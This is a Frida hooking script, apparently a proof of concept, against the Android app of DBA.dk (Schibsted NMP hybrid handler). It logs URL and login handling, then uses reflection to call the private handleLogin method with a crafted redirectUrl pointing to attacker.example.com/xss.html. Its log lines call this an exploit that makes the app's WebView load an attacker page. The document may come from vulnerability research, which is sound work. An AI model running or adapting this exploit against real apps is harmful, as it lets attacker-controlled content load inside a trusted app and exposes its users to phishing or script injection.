import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        
        // Hook handleUrl to see all URL navigations in HybridView
        try {
            const NMPHybridHandler = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
            
            // Hook handleUrl to observe all navigations
            NMPHybridHandler.handleUrl.implementation = function(url: any) {
                console.log("[H001] handleUrl called: " + url);
                return (this as any).handleUrl(url);
            };
            console.log("[H001] handleUrl hook installed");
            
            // Also hook handleLogin to confirm it processes redirectUrl
            try {
                NMPHybridHandler.handleLogin.overload("android.net.Uri").implementation = function(uri: any) {
                    console.log("[H001] handleLogin called with URI: " + uri.toString());
                    const redirectUrl = uri.getQueryParameter("redirectUrl");
                    console.log("[H001] redirectUrl parameter: " + redirectUrl);
                    return (this as any).handleLogin(uri);
                };
                console.log("[H001] handleLogin hook installed");
            } catch (e2: any) {
                console.log("[H001] handleLogin hook warning: " + e2);
            }
            
        } catch (e: any) {
            console.log("[H001-ERROR] Hook installation failed: " + e);
        }
        
        // Find live NMPHybridHandler instance and invoke handleLogin directly
        setTimeout(function() {
            Java.choose("com.schibsted.nmp.android.hybrid.NMPHybridHandler", {
                onMatch: function(instance: any) {
                    console.log("[H001] Found live NMPHybridHandler instance: " + instance);
                    
                    try {
                        // Use reflection to invoke private handleLogin method
                        const NMPHybridHandlerClass = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
                        const UriClass = Java.use("android.net.Uri");
                        
                        // Parse the malicious URL
                        const maliciousUri = UriClass.parse(
                            "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                        );
                        console.log("[H001] Invoking handleLogin with malicious redirectUrl=https://attacker.example.com/xss.html");
                        
                        // Call via reflection to bypass access modifiers
                        const javaClass = NMPHybridHandlerClass.class;
                        const methods = javaClass.getDeclaredMethods();
                        for (let i = 0; i < methods.length; i++) {
                            const m = methods[i];
                            const name = m.getName();
                            if (name === "handleLogin") {
                                console.log("[H001] Found handleLogin method: " + m.toString());
                                m.setAccessible(true);
                                try {
                                    const result = m.invoke(instance, [maliciousUri]);
                                    console.log("[H001] handleLogin() returned: " + result);
                                    console.log("[H001] EXPLOIT: redirectUrl passed to new HybridScreen, attacker URL loading");
                                } catch (invokeErr: any) {
                                    console.log("[H001] invoke error: " + invokeErr);
                                }
                                break;
                            }
                        }
                    } catch (e2: any) {
                        console.log("[H001-INVOKE-ERROR] " + e2);
                    }
                },
                onComplete: function() {
                    console.log("[H001] Java.choose complete");
                }
            });
        }, 2000);
    });
}

run();
